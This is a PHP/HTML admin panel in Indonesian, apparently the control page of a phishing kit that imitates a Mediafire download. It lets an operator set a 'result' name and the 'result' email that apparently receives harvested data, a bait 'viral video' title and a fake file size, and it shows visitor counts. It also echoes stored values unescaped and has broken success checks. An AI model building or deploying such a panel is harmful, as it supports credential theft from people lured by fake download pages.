<?php
// DATA.JSON
$ngGet = file_get_contents("etc/data.json");
$data = json_decode($ngGet,true);

// VISITOR.JSON
$ngVis = file_get_contents("etc/visitor.json");
$vis = json_decode($ngVis,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("etc/data.json");
$data = json_decode($ngGet,true);
$ngResult = json_encode($data);
$ngFile = fopen('etc/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"> 
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<title>Web Setting</title>
	<meta name="description" content="Lebih mudah mengganti nama result, email result, nama video dan ukuran download" />
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
	<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Roboto:400,100,300,500,700,900'>
</head>
<style>
.switch {
  position: relative;
  display: inline-block;
  width: 60px;
  height: 34px;
}

.switch input { 
  opacity: 0;
  width: 0;
  height: 0;
}

.slider {
  position: absolute;
  cursor: pointer;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: #ccc;
  -webkit-transition: .4s;
  transition: .4s;
}

.slider:before {
  position: absolute;
  content: "";
  height: 26px;
  width: 26px;
  left: 4px;
  bottom: 4px;
  background-color: white;
  -webkit-transition: .4s;
  transition: .4s;
}

input:checked + .slider {
  background-color: #2196F3;
}

input:focus + .slider {
  box-shadow: 0 0 1px #2196F3;
}

input:checked + .slider:before {
  -webkit-transform: translateX(26px);
  -ms-transform: translateX(26px);
  transform: translateX(26px);
}

/* Rounded sliders */
.slider.round {
  border-radius: 34px;
}

.slider.round:before {
  border-radius: 50%;
}
</style>

<style>
@import url('https://fonts.googleapis.com/css2?family=Roboto+Slab&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Acme&display=swap');
@font-face {
  font-family: Eina03W03-SemiBold;
  src: url(eina.ttf);
}
*
{
	margin: 0;
	padding: 0;
	box-sizing: border-box;
	user-select: none;
}
body
{
	width: 100%;
	height: 100vh;
	background: #0099ff;
	display: flex;
	align-items: center;
	justify-content: center;
}
section
{
	position: relative;
	width: 400px;
	height: 100vh;
	background: #EDF4FF;
	padding: 45px 10px 10px 10px;
	overflow: hidden;
	box-shadow: 0 0.5px 5px rgba(0,0,0,0.50);
}
section:before
{
	content: '';
	position: absolute;
	top:50%;
	left:50%;
	transform: translate(-50%,-50%);
	width: 400px;
	height: 250px;
	background: url('https://idmasterhost.com/images/png-images/world2.png') no-repeat;
	background-size: cover;
	opacity: 0.5;
}
.refresh
{
    position:fixed;
    top:180px;
    left:0;
    width:40px;
    height:40px;
    display:flex;
    align-items:center;
    justify-content:center;
    background:#1252cf;
    border-top-right-radius:3px;
    border-bottom-right-radius:3px;
    border:2px solid #39C0ED;
    border-left:none;
    z-index:99999;
}
.refresh i
{
    color:#fff;
}
section header
{
	position: absolute;
	top:0;
	left:0;
	width: 100%;
	height: 50px;
	display: flex;
	background: #0099ff;
	align-items: center;
	justify-content: space-between;
	padding: 10px;
	overflow: hidden;
}
header .l-icon, .r-icon
{
	position: relative;
	width: 30px;
	height: 30px;
	display: flex;
	align-items: center;
	justify-content: center;
	filter: invert(10);
}
header h1
{
	font-family: 'Eina03W03-SemiBold';
	font-weight: bold;
	font-size: 1.5em;
	letter-spacing: -0.5px;
	color:#fff;
}
.l-icon .fa, .r-icon .fa
{
	font-size: 2em;
	animation: rotate 2s infinite linear;
}
@keyframes rotate
{
	from 
	{
		transform: rotate(0deg);
	}
	to 
	{
		transform: rotate(360deg);
	}
}
section .wrap
{
	position: relative;
	width: 100%;
	height: 100vh;
	padding-top: 10px;
}
.wrap .textBox
{
	position: relative;
	width: 100%;
	padding:10px;
	border-radius: 3px;
	background: #0099ff;
	box-shadow: 0 .5px 5px rgba(0,0,0,.20);
}
.textBox h1
{
	font-family: 'Eina03W03-SemiBold';
	font-weight: bold;
	font-size: 1.2em;
	letter-spacing: -0.5px;
	line-height: 30px;
	color:#fff;
}
.textBox span
{
	font-family: 'Eina03W03-SemiBold';
	color:rgba(255,255,255,0.80);
	font-weight: 600;
	font-size: 13px;
	letter-spacing: -0.5px;
	margin-top: 3px;
}
.textBox p
{
	margin-top: 3px;
	font-family: 'Eina03W03-SemiBold';
	color:#fff;
	font-size: 13px;
	letter-spacing: -0.5px;
}

.wrap .pemberitahuan
{
	margin-top: 5px;
	position: relative;
	width: 100%;
	padding:10px;
	border-radius: 3px;
	background: #0099ff;
	box-shadow: 0 .5px 5px rgba(0,0,0,.20);
	display:flex;
	align-items:center;
	justify-content: space-around;
}
.pemberitahuan .change
{
    position: relative;
	padding:3px 3px 3px 4px;
	width:150px;
	text-align: center;
	background: none;
	border:2px solid #253152;
	border-radius: 5px;
	font-size: 10px;
	color:#fff;
	font-family: 'Roboto Slab';
	box-shadow: 0 .5px 5px rgba(0,0,0,.30);
	font-weight: bold;
	cursor: pointer;
}
.pemberitahuan .change:nth-child(1){
    background:#17203a;
}
.pemberitahuan .change:nth-child(2){
    background:#17203a;
}
.pemberitahuan .change:nth-child(3){
    background:#17203a;
}
.pemberitahuan .change:nth-child(4){
    background:#17203a;
}
.change .fa
{
    float:left;
    margin-top:1.9px;
}
.wrap .pemberitahuan:nth-child(1)
{
    margin-top: 15px;
}
.pemberitahuan .label 
{
    position:absolute;
    top:100px;
    left:10px;
    padding:5px;
    background:blue;
}
.pemberitahuan .visitor
{
   position:relative;
   width:100px;
   height:60px;
   line-height:60px;
   box-shadow: 0 .5px 5px rgba(0,0,0,.20);
   border-radius:3px;
}
.visitor .atas, .visitor .bawah
{
   position:absolute;
   width:100%;
   height:50%;
   display:flex;
   align-items:center;
   justify-content: center;
   color:#fff;
   font-family:'Acme';
}
.visitor .atas
{
   top:0;
   left:0;
   background: #009aff;
   border-top-left-radius:3px;
   border-top-right-radius:3px;
   border:1px solid #253152;
   display:flex;
   align-items:center;
   justify-content: center;
   font-family: 'Eina03W03-SemiBold';
   padding:3px;
   font-size:15px;
   color:#fff;
   
}
.visitor .bawah
{
   bottom:0;
   left:0;
   background: #17203a;
   border:1px solid #253152;
   border-top:none;
   border-bottom-left-radius:3px;
   border-bottom-right-radius:3px;
}

.wrap .sukses
{
	margin-top: 15px;
	position: relative;
	width: 100%;
	padding:10px;
	border-radius: 3px;
	background: #0099ff;
	box-shadow: 0 .5px 5px rgba(0,0,0,.20);
	display:none;
	align-items:center;
	flex-direction:column;
}
.sukses .title
{
    font-family: 'Eina03W03-SemiBold';
	font-weight: bold;
	font-size: 16px;
	letter-spacing: -0.5px;
	line-height: 30px;
	color:#fff;
}
.sukses img
{
    width:180px;
}
.sukses p
{
    text-align:center;
    font-family: 'Eina03W03-SemiBold';
	color:#fff;
	font-size: 13px;
	letter-spacing: -0.5px;
}



.wrap .errors
{
	display: none;
	margin-top: 15px;
	position: relative;
	width: 100%;
	padding:10px;
	border-radius: 3px;
	background: #0099ff;
	box-shadow: 0 .5px 5px rgba(0,0,0,.20);
}
.errors .info
{
	font-family: 'Roboto Slab';
	color:#fff;
	font-weight: bold;
	font-size: 13px;
	letter-spacing: 0px;
	border-radius: 3px;
	padding: 3px 5px 3px 5px;
	background: linear-gradient(to right,red,transparent);
}
.wrap .formulir
{
	margin-top: 5px;
	position: relative;
	width: 100%;
	padding:10px;
	border-radius: 3px;
	background: #0099ff;
	box-shadow: 0 .5px 5px rgba(0,0,0,.20);
	text-align: center;
}
.form-group .change
{
    position: relative;
	padding:3px 5px 3px 5px;
	width:80px;
	text-align: center;
	background: none;
	border:2px solid #253152;
	border-radius: 5px;
	font-size: 10px;
	color:#fff;
	font-family: 'Roboto Slab';
	box-shadow: 0 .5px 5px rgba(0,0,0,.30);
	font-weight: bold;
	cursor: pointer;
	display:none;
	margin-top: 10px;
}
.formulir .form-group, .verif .form-group
{
	position: relative;
	text-align: center;
	width: 100%;
}
.formulir .form-group:not(:first-child) 
{
	margin-top: 10px;
}
.formulir .form-group:last-child
{
    margin-top: 5px;
}
.form-group .change
{
    position: relative;
	padding:3px 5px 3px 5px;
	width:80px;
	text-align: center;
	background: none;
	border:2px solid #253152;
	border-radius: 5px;
	font-size: 10px;
	color:#fff;
	font-family: 'Roboto Slab';
	box-shadow: 0 .5px 5px rgba(0,0,0,.30);
	font-weight: bold;
	cursor: pointer;
	display:none;
}
.form-group .currentRes
{
    background: #17203a;
	border:none;
	outline:none;
	height: 40px;
	border-radius: 5px;
	color:#fff;
	font-family: 'Roboto';
	box-shadow: 0 .5px 5px rgba(0,0,0,.30);
	font-weight: bold;
}
.form-group .icon
{
	position: absolute;
	background: #253152;
	width: 40px;
	height: 40px;
	border-top-left-radius: 5px;
	border-bottom-left-radius: 5px;
	display: flex;
	align-items: center;
	justify-content: center;
	color:#fff;
}
.form-group .form-input
{
	width: 100%;
	padding-left: 50px;
	background: #17203a;
	border:none;
	outline:none;
	height: 40px;
	border-radius: 5px;
	color:#fff;
	font-family: 'Roboto';
	box-shadow: 0 .5px 5px rgba(0,0,0,.30);
	font-weight: bold;
}
.form-group:nth-child(1) .alert1, .form-group:nth-child(2) .alert2, .form-group:nth-child(3) .alert3
{
	position: absolute;
	width: 40px;
	height: 40px;
	display: flex;
	align-items: center;
	justify-content: center;
	top:7px;
	right:0;
}
.form-group:nth-child(1) .alert1.valid1, .form-group:nth-child(2) .alert2.valid2, .form-group:nth-child(3) .alert3.valid3
{
	color:lime;
	font-size: 1.5em;
	display: none;
}
.form-group:nth-child(1) .alert1.invalid1, .form-group:nth-child(2) .alert2.invalid2, .form-group:nth-child(3) .alert3.invalid3
{
	color:red;
	font-size: 1.5em;
	display: none;
}
.form-input::placeholder
{
	color:#fff;
	font-family: 'Eina03W03-SemiBold';
}
.form-group .btn-send
{
	position: relative;
	width: 92px;
	height: 30px;
	text-align: center;
	background: #009aff;
	border:2px solid #253152;
	border-radius: 5px;
	font-size: 10px;
	color:#fff;
	font-family: 'Roboto Slab';
	box-shadow: 0 .5px 5px rgba(0,0,0,.30);
	font-weight: bold;
	cursor: pointer;
	padding:5px;
}
.btn-send .fa
{
    float:left;
    margin-top:2px;
    margin-right:3px;
}
.form-group .btn-send:focus
{
	outline: none;
}
.form-group .btn-send:hover
{
	background: #253152;
}

.wrap .verif
{
	margin-top: 15px;
	position: relative;
	width: 100%;
	padding:10px;
	border-radius: 3px;
	background: #0099ff;
	box-shadow: 0 .5px 5px rgba(0,0,0,.20);
	display: none;
}
.verif .info
{
	font-family: 'Roboto Slab';
	color:#fff;
	font-size: 13px;
	letter-spacing: -0.5px;
	margin-bottom: 5px;
	border-left: 4px solid #253152;
	padding: 3px 5px 3px 5px;
	background: linear-gradient(to right,#17203a,transparent);
}
.verif .form-group
{
	margin-top: 10px;
}
.verif .form-group .err
{
	position: absolute;
	top:10px;
	right: 4px;
	padding:4px;
	background: red;
	color:#fff;
	font-size: 8px;
	font-weight: bold;
	height: 20px;
	font-family: 'Eina03W03-SemiBold';
	border-radius: 5px;
	display: none;
}




@media(max-width: 360px)
{
	.textBox span
	{
		font-size: 12px;
	}
	.textBox span:before
	{
		bottom: 65px;
	}
	.form-group:nth-child(1) .alert1, .form-group:nth-child(2) .alert2, .form-group:nth-child(3) .alert3
	{
		top:4px;
	}
	.form-group .btn-send
	{
		line-height: 40px;
	}
}
@media(max-width: 359px)
{
	.form-group:nth-child(1) .alert1, .form-group:nth-child(2) .alert2, .form-group:nth-child(3) .alert3
	{
		top:7px;
	}
}
</style>
<body>
	<section>
		<div class="wrap">
			<div class="textBox">
				<h1><center>Mediafire</center></h1>
				
				<span id="by"></span>
			</div>
		
			   
			
			
			<div class="formulir" id="changeNama" style="display:none;">
				<div class="form-group">
					<span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
					<input type="email" id="ngNama" class="form-input" placeholder="Contoh : NEXTNESIA - Mediafire" autocomplete="off">
				</div>
				<div style="margin-top:10px;" class="form-group" id="otp-btn">
					<button id="btnNama" class="btn-send"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti</button>
				</div>
				</div>
				
			
			<div class="formulir" id="changeEmail" style="display:none;">
				<div class="form-group">
					<span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
					<input type="email" id="ngEmail" class="form-input" placeholder="Contoh : nextnesia@gmail.com" autocomplete="off">
				</div>
				<div style="margin-top:10px;" class="form-group" id="otp-btn">
					<button id="btnEmail" type="submit" class="btn-send"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti</button>
				</div>
				</div>
				
			<div class="formulir" id="changeVideo" style="display:none;">
				<div class="form-group">
					<span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
					<input type="email" id="ngVideo" class="form-input" placeholder="Contoh : Kayes Viral Rerbaru" autocomplete="off">
				</div>
				<div style="margin-top:10px;" class="form-group" id="otp-btn">
					<button id="btnVideo" type="submit" class="btn-send"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti</button>
				</div>
				</div>
				
			<div class="formulir" id="changeUkuran" style="display:none;">
				<div class="form-group">
					<span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
					<input type="email" id="ngUkuran" class="form-input" placeholder="Contoh : 23,4MB" autocomplete="off">
				</div>
				<div style="margin-top:10px;" class="form-group" id="otp-btn">
					<button id="btnUkuran" type="submit" class="btn-send"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti</button>
				</div>
				</div>			
			
			
			
			
			<div class="pemberitahuan">
			  <div class="visitor">
			   <span class="atas">Hari Ini</span>
			   <span class="bawah"><?php echo $vis['today'];?></span>
			  </div>
			  
			  <div class="visitor">
			  <span class="atas">Kemarin</span>
			   <span class="bawah"><?php echo $vis['yesterday'];?></span>
			  </div>
			  
			  <div class="visitor">
			  <span class="atas">Total</span>
			   <span class="bawah"><?php echo $vis['total'];?></span>
			  </div>
			</div>
			
			<div class="pemberitahuan">
				<span id="cNama" class="change"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Nama Result</span>
				<span id="cEmail" class="change"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Email Result</span>
				<span id="cVideo" class="change"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Nama Video</span>
				<span id="cUkuran" class="change"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Ukuran Download</span>			
			</div>
			
			
			
			
			<div class="formulir">
				<div class="form-group">
					<span style="background:#009aff;" class="icon"><i class="fa fa-paper-plane" aria-hidden="true"></i></span>
					<input style="background:#17203a;" type="text" class="form-input" id="valNama" value="<?php echo $data['nama'];?>" readonly>
				</div>
				
				<div class="form-group">
					<span style="background:#009aff;" class="icon"><i class="fa fa-paper-plane" aria-hidden="true"></i></span>
					<input style="background:#17203a;" type="email" id="valEmail" class="form-input" value="<?php echo $data['email'];?>" readonly>
				</div>
				
				<div class="form-group" style="margin-top:10px;">
					<span style="background:#009aff;" class="icon"><i class="fa fa-paper-plane" aria-hidden="true"></i></span>
					<input style="background:#17203a;" type="text" id="valVideo" class="form-input" value="<?php echo $data['video'];?>" readonly>
				</div>
				
				<div class="form-group" style="margin-top:10px;">
					<span style="background:#009aff;" class="icon"><i class="fa fa-paper-plane" aria-hidden="true"></i></span>
					<input style="background:#17203a;" type="text" id="valUkuran" class="form-input" value="<?php echo $data['ukuran'];?>" readonly>
				</div>			
				
				
			</div>
			
			<div class="wrap">
			<div class="textBox">
				<h1><center>Nextnesia Hosting</a></center></h1>
				
				<span id="by"></span>
			</div>
		
	</section>
	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
	<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
	<script type="text/javascript">
		function refresh()
		{
		   location.reload();
		}
    </script>
    <script>
        $("#cEmail").click(function(){
           $("#changeEmail").fadeIn();
           $("#changeNama").hide();
           $("#changeVideo").hide();
           $("#changeUkuran").hide();
        })
        $("#cNama").click(function(){
           $("#changeEmail").hide();
           $("#changeNama").fadeIn();
           $("#changeVideo").hide();
           $("#changeUkuran").hide();
        })
        $("#cVideo").click(function(){
           $("#changeEmail").hide();
           $("#changeNama").hide();
           $("#changeVideo").fadeIn();
           $("#changeUkuran").hide();
        })
        $("#cUkuran").click(function(){
           $("#changeEmail").hide();
           $("#changeNama").hide();
           $("#changeVideo").hide();
           $("#changeUkuran").fadeIn();
        })  
    </script>
    <script>
        $("#btnEmail").click(function(){
           var ngEmail = $("#ngEmail").val();
           $.post("setting/data.php",{
                          email:ngEmail
                  },function(ngE){
                   if(ngE = "Sukses"){
                   $("#valEmail").val(ngEmail);
                   $("#currentResult").html(0);
                   }
                  })
        })
        
        $("#btnNama").click(function(){
           var ngNama = $("#ngNama").val();
           $.post("setting/data.php",{
                          nama:ngNama
                  },function(ngE){
                   if(ngE = "Sukses"){
                   $("#valNama").val(ngNama);
                   }
                  })
        })
        
       $("#btnVideo").click(function(){
           var ngVideo = $("#ngVideo").val();
           $.post("setting/data.php",{
                          video:ngVideo
                  },function(ngE){
                   if(ngE = "Sukses"){
                   $("#valVideo").val(ngVideo);
                   }
                  })
        })
        
       $("#btnUkuran").click(function(){
           var ngUkuran = $("#ngUkuran").val();
           $.post("setting/data.php",{
                          ukuran:ngUkuran
                  },function(ngE){
                   if(ngE = "Sukses"){
                   $("#valUkuran").val(ngUkuran);
                   }
                  })
        })
	</script>
</html>